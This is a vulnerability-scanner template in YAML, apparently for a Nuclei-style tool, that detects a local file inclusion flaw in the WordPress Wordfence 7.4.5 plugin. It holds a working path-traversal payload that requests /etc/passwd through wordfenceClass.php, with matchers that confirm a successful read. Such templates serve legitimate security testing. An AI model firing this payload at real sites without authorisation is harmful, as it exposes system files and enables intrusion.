id: "wordpress-wordfence-lfi"
name: "WordPress Wordfence 7.4.5 - Local File Inclusion"
severity: "high"
description: "WordPress Wordfence 7.4.5 is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "wordfence"
  - "edb"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/48061"
spaExclusion: true
request:
  method: "GET"
  path: "/wp-content/plugins/wordfence/lib/wordfenceClass.php?file=/../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "status"
    status:
      - 200
